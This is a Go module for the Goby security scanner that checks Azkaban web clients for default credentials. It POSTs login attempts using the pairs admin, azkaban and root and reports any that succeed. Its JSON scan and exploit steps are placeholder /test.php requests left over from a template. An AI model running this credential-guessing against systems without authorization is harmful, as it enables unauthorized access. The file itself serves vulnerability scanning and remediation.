package exploits

import (
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Azkaban Default Password",
    "Description": "<p>Azkaban is a batch workflow job scheduler created at LinkedIn to run Hadoop jobs.  Default web client credentials were discovered.</p>",
    "Product": "Azkaban",
    "Homepage": "https://azkaban.github.io",
    "DisclosureDate": "2022-02-23",
    "Author": "1276896655@qq.com",
    "FofaQuery": "title=\"Azkaban Web Client\"",
    "GobyQuery": "title=\"Azkaban Web Client\"",
    "Level": "1",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/default-logins/azkaban/azkaban-default-login.yaml"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Azkaban默认口令",
            "Product": "Azkaban",
            "Description": "<p>Azkaban 是在 LinkedIn 创建的批处理工作流作业调度程序，用于运行 Hadoop 作业。该应用存在默认口令，攻击者可以登录该系统获取敏感信息。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Azkaban Default Password",
            "Product": "Azkaban",
            "Description": "<p>Azkaban is a batch workflow job scheduler created at LinkedIn to run Hadoop jobs.  Default web client credentials were discovered.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10977"
}`

	//请求发送
	//注意：本函数传入的参数为hostInfo
	//注意：模板编写后务必全局替换后面随机字符AAAA, POC检测函数也需要同步修改
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/`
		vulInfo := ``
		pwdInfoList := []string{`admin`, `azkaban`, `root`}

		for _, pwdInfo := range pwdInfoList {
			postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			postRequestConfig.Header.Store("Content-Type", " application/x-www-form-urlencoded")
			postRequestConfig.Data = fmt.Sprintf("action=login&username=%s&password=%s", pwdInfo, pwdInfo)
			//请求
			response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
			if err != nil {
				return false, vulInfo, vulPath
			}
			if strings.Contains(response.RawBody, "success") {
				vulInfo = pwdInfo + ":" + pwdInfo
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadyp2Vnbp5(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
